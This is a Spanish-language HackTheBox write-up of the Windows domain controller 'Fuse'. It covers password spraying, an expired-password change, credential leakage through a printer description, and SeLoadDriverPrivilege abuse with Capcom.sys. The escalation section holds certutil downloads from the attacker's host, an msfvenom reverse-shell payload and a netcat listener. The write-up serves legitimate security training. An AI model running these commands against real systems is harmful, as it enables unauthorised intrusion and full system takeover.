---
icon: windows
---

# Fuse

### Resumen

#### Detalles

| Campo      | Valor                                      |
| ---------- | ------------------------------------------ |
| Nombre     | Fuse                                       |
| SO         | Windows Server 2016 Standard (build 14393) |
| Plataforma | HackTheBox                                 |
| Fecha      | 26/11/2026                                 |
| IP         | 10.129.2.5                                 |

#### Executive Summary

Fuse es un controlador de dominio de `fabricorp.local`. La vía de entrada arranca en un **PaperCut Print Logger** expuesto en el puerto 80: sus registros de impresión filtran nombres de usuario del dominio y títulos de documentos. Con esos títulos y `cewl` se genera un diccionario que, probado contra los usuarios validados con `kerbrute`, revela que la contraseña `Fabricorp01` es válida pero está **expirada** (`STATUS_PASSWORD_MUST_CHANGE`).

Forzar el cambio de contraseña con `smbpasswd.py` deja muy poco tiempo para autenticarse —la máquina restablece las cuentas periódicamente y la política rechaza contraseñas débiles—, el justo para lanzar `rpcclient` y enumerar las impresoras. La **descripción de la impresora HP-MFT01** contiene la contraseña del servicio `scan2docs`: `$fab@s3Rv1ce$1`, válida para `svc-print` y `svc-scan`, cuentas no afectadas por el reseteo. `svc-print` pertenece a _Remote Management Users_, lo que permite entrar por WinRM y leer la flag de usuario.

Ya en el sistema, `svc-print` tiene habilitado **SeLoadDriverPrivilege**. Abusando de él se carga el driver vulnerable `Capcom.sys` mediante una entrada de registro en `HKCU` y `NtLoadDriver`; después `ExploitCapcom.exe` usa ese driver para ejecutar un payload como `NT AUTHORITY\SYSTEM`, consiguiendo la flag de root.

#### Técnicas

* Information Disclosure (PaperCut Print Logger)
* User Enumeration (kerbrute)
* Wordlist Generation (cewl)
* Password Spraying
* Expired Password Change
* RPC Enumeration (enumprinters)
* Credential Disclosure
* Remote Access (WinRM)
* SeLoadDriverPrivilege Abuse (Capcom.sys)

### Information Gathering

#### Port Scanning

```bash
sudo nmap -sSVC -Pn -n -v --min-rate 5000 -p- 10.129.2.5
```

| Puerto     | Servicio     | Versión                                                                |
| ---------- | ------------ | ---------------------------------------------------------------------- |
| 53/tcp     | domain       | Simple DNS Plus                                                        |
| 80/tcp     | http         | Microsoft IIS httpd 10.0                                               |
| 88/tcp     | kerberos-sec | Microsoft Windows Kerberos                                             |
| 135/tcp    | msrpc        | Microsoft Windows RPC                                                  |
| 139/tcp    | netbios-ssn  | Microsoft Windows netbios-ssn                                          |
| 389/tcp    | ldap         | Microsoft Windows Active Directory LDAP (Domain: fabricorp.local)      |
| 445/tcp    | microsoft-ds | Windows Server 2016 Standard 14393 microsoft-ds (workgroup: FABRICORP) |
| 464/tcp    | kpasswd5     |                                                                        |
| 593/tcp    | ncacn\_http  | Microsoft Windows RPC over HTTP 1.0                                    |
| 636/tcp    | tcpwrapped   |                                                                        |
| 3268/tcp   | ldap         | Microsoft Windows Active Directory LDAP (Domain: fabricorp.local)      |
| 5985/tcp   | http         | Microsoft HTTPAPI httpd 2.0 (WinRM)                                    |
| 9389/tcp   | mc-nmf       | .NET Message Framing                                                   |
| 49666+/tcp | msrpc        | Microsoft Windows RPC (puertos dinámicos)                              |

El conjunto DNS + Kerberos + LDAP + SMB sobre Windows Server 2016 identifica la máquina como **controlador de dominio** de `fabricorp.local` (FQDN `Fuse.fabricorp.local`).

#### Enumeration

**SMB.** La sesión nula está parcialmente abierta, pero la enumeración de usuarios y el RID brute-force están bloqueados, y la cuenta `guest` está deshabilitada:

```bash
nxc smb 10.129.2.5
# Windows Server 2016 Standard 14393 x64 (name:FUSE) (domain:fabricorp.local) (signing:True) (SMBv1:True) (Null Auth:True) (DC:True)

nxc smb 10.129.2.5 -u '' -p '' --rid-brute
# [-] LSAD SessionError: STATUS_ACCESS_DENIED

nxc smb 10.129.2.5 -u 'guest' -p ''
# [-] fabricorp.local\guest: STATUS_ACCOUNT_DISABLED
```

**HTTP (80).** `fabricorp.local` redirige a `fuse.fabricorp.local`, así que se añaden ambos nombres al `/etc/hosts`. El sitio sirve un **PaperCut Print Logger**, con registros de impresión por día en HTML y CSV.

<figure><img src="../../../.gitbook/assets/PaperCut Print Logger.png" alt="PaperCut Print Logger"><figcaption><p>PaperCut Print Logger expuesto en el puerto 80</p></figcaption></figure>

Los registros de impresión exponen nombres de usuario del dominio y los títulos de los documentos impresos:

<figure><img src="../../../.gitbook/assets/Logs de impresion pmerton tlavel.png" alt="Logs de impresion pmerton tlavel"><figcaption><p>Registros de impresión: usuarios pmerton y tlavel y sus documentos</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/Logs de impresion sthompson Fabricorp01.docx.png" alt="Logs de impresion sthompson Fabricorp01.docx"><figcaption><p>Registros de sthompson, incluido el documento Fabricorp01.docx</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/Logs de impresion bhult administrator.png" alt="Logs de impresion bhult administrator"><figcaption><p>Registros de bhult y administrator</p></figcaption></figure>

De aquí salen los usuarios y, sobre todo, un título muy revelador: **`Fabricorp01.docx`**.

Usuarios expuestos en los logs:

* pmerton
* tlavel
* sthompson
* bhult
* administrator

Se validan contra el KDC con `kerbrute`, confirmando que todos existen en el dominio:

```bash
kerbrute -users users.txt -domain FABRICORP.LOCAL
# [*] Valid user => pmerton
# [*] Valid user => tlavel
# [*] Valid user => sthompson
# [*] Valid user => bhult
# [*] Valid user => administrator
```

Con `cewl` se construye un diccionario a partir del texto de los propios logs (incluyendo números), que recoge términos como `Fabricorp01`:

```bash
cewl http://fuse.fabricorp.local/papercut/logs/csv/daily/papercut-print-log-2020-05-29.csv --with-numbers > wordlist.txt
cewl http://fuse.fabricorp.local/papercut/logs/csv/daily/papercut-print-log-2020-05-30.csv --with-numbers >> wordlist.txt
cewl http://fuse.fabricorp.local/papercut/logs/html/papercut-print-log-2020-06-10.htm --with-numbers >> wordlist.txt
```

### Explotación

#### Foothold

**Vulnerabilidad.** Credenciales de dominio débiles y reutilizadas filtradas vía PaperCut, más una contraseña de servicio almacenada en claro en la descripción de una impresora.

**Procedimiento.**

1. Se prueba el diccionario contra todos los usuarios. `Fabricorp01` es válida para varios usuarios pero está **expirada** (`STATUS_PASSWORD_MUST_CHANGE`):

<figure><img src="../../../.gitbook/assets/Password spray Fabricorp01 must change.png" alt="Password spray Fabricorp01 must change"><figcaption><p>Password spray: Fabricorp01 es válida pero marcada STATUS_PASSWORD_MUST_CHANGE</p></figcaption></figure>

2. Se fuerza el cambio de la contraseña expirada con `smbpasswd.py` (fork de Impacket), que se vincula con sesión nula cuando la contraseña está expirada:

```bash
smbpasswd.py fabricorp.local/bhult:Fabricorp01@10.129.2.5
# 'New Password': <contraseña compleja>
# [!] Password is expired, trying to bind with a null session.
# [*] Password was changed successfully.
```

3. El tiempo disponible es muy corto: la política de contraseñas rechaza las contraseñas simples o parecidas a la anterior, y una tarea restablece las cuentas periódicamente. En la práctica solo da tiempo a **una** acción autenticada por cada cambio. Esa acción se usa para enumerar por RPC y, en concreto, las impresoras:

```bash
rpcclient -U 'bhult%<contraseña compleja>' 10.129.2.5
rpcclient $> enumprinters
#   name:[\\10.129.2.5\HP-MFT01]
#   description:[\\10.129.2.5\HP-MFT01,HP Universal Printing PCL 6,Central (Near IT, scan2docs password: "$fab@s3Rv1ce$1")]
```

<figure><img src="../../../.gitbook/assets/Descripcion de impresora con credencial scan2docs.png" alt="Descripcion de impresora con credencial scan2docs"><figcaption><p>La descripción de la impresora filtra la contraseña de scan2docs: $fab@s3Rv1ce$1</p></figcaption></figure>

4. La descripción de **HP-MFT01** filtra la contraseña del servicio `scan2docs`: `$fab@s3Rv1ce$1`. Probada contra los usuarios, es válida para `svc-print` y `svc-scan` —cuentas de servicio que **no** sufren el reseteo—:

```bash
nxc smb 10.129.2.5 -u users.txt -p passwords.txt --continue-on-success
# [+] fabricorp.local\svc-print:$fab@s3Rv1ce$1
# [+] fabricorp.local\svc-scan:$fab@s3Rv1ce$1
```

5. `svc-print` pertenece a _Remote Management Users_, así que es válida para WinRM:

```bash
nxc winrm 10.129.2.5 -u 'svc-print' -p '$fab@s3Rv1ce$1'
# [+] fabricorp.local\svc-print:$fab@s3Rv1ce$1 (Pwn3d!)
```

**Evidencia.** Sesión Evil-WinRM como `svc-print` y lectura de la flag de usuario:

<figure><img src="../../../.gitbook/assets/Evil-WinRM svc-print user.txt.png" alt="Evil-WinRM svc-print user.txt"><figcaption><p>Sesión Evil-WinRM como svc-print y lectura de user.txt</p></figcaption></figure>

#### Privesc

**Vulnerabilidad.** El usuario `svc-print` tiene habilitado **SeLoadDriverPrivilege**, que permite cargar drivers de dispositivo en el kernel. Cargando un driver vulnerable conocido (`Capcom.sys`) se consigue ejecución como SYSTEM.

```bat
whoami /priv
# SeLoadDriverPrivilege    Load and unload device drivers    Enabled
```

**Exploit.** `Capcom.sys` (driver vulnerable, de <a href="https://github.com/FuzzySecurity/Capcom-Rootkit" target="_blank">FuzzySecurity/Capcom-Rootkit</a>) + `ExploitCapcom.exe` (de <a href="https://github.com/JoshMorrison99/SeLoadDriverPrivilege" target="_blank">JoshMorrison99/SeLoadDriverPrivilege</a>). La carga del driver vía `NtLoadDriver` sobre una clave de `HKCU` se hace con un pequeño PoC en PowerShell: <a href="https://github.com/frxn4f/SeLoadDriver-PoC" target="_blank">frxn4f/SeLoadDriver-PoC</a>.

**Procedimiento.**

1. Se sirven los binarios desde el atacante y se descargan en la máquina:

```bash
python3 -m http.server 8082
```

```powershell
certutil -f -urlcache http://10.10.14.108:8082/Driver/Capcom.sys
certutil -f -urlcache http://10.10.14.108:8082/ExploitCapcom.exe
```

2. Se carga el driver vulnerable aprovechando SeLoadDriverPrivilege:

```powershell
Import-Module .\LoadDrv.ps1 -Force
Invoke-LoadDriver -DriverPath C:\Users\svc-print\Documents\Capcom.sys
```

3. Se genera un payload de reverse shell y se pone a la escucha:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.108 LPORT=9401 -f exe -o payload.exe
rlwrap -Acr netcat -lvnp 9401
```

```powershell
certutil -f -urlcache http://10.10.14.108:8082/payload.exe payload.exe
```

4. Se ejecuta `ExploitCapcom.exe` apuntando al payload; el exploit roba el token de SYSTEM y lanza el proceso:

```powershell
.\ExploitCapcom.exe C:\Users\svc-print\Documents\payload.exe
```

<figure><img src="../../../.gitbook/assets/ExploitCapcom shell SYSTEM.png" alt="ExploitCapcom shell SYSTEM"><figcaption><p>ExploitCapcom.exe roba el token y lanza una shell SYSTEM</p></figcaption></figure>

**Evidencia.** Shell inversa recibida como `nt authority\system` y lectura de la flag de root:

<figure><img src="../../../.gitbook/assets/Reverse shell SYSTEM root.txt.png" alt="Reverse shell SYSTEM root.txt"><figcaption><p>Shell inversa recibida como nt authority\system y lectura de root.txt</p></figcaption></figure>

#### Notes

* `fabricorp.local` redirige a `fuse.fabricorp.local`: hay que añadir ambos nombres al `/etc/hosts` para que cargue el PaperCut.
* El escaneo marcó un desfase de reloj notable con el DC (`clock-skew`), relevante si se usan técnicas basadas en Kerberos (en esta vía no hizo falta).
* El punto más delicado del foothold es la carrera contra el reseteo de contraseñas: conviene preparar de antemano el comando a ejecutar justo después del cambio, porque solo da tiempo a una petición autenticada.
